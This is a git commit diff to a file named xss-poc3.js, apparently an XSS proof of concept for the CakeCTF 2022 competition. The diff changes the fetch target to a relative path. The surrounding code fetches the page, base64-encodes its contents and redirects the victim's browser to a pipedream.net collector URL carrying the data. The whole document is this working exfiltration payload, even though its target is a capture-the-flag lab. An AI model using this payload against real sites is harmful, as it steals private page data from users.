40c506edc8954c74ffcb7120432e82f364960b22
hi.suguru <36875372+LorseKudos@users.noreply.github.com>
2022-09-04 00:20:53 +0900

    Update xss-poc3.js

--- xss-poc3.js
+++ xss-poc3.js
@@ -1,5 +1,5 @@
 
-fetch("http://web1.2022.cakectf.com:8003/").then((res) => {
+fetch("/").then((res) => {
 	return res.text();
 }).then(data => {
 	location.href="https://enghd2bd35t7sh5.m.pipedream.net/?data="+btoa(data)
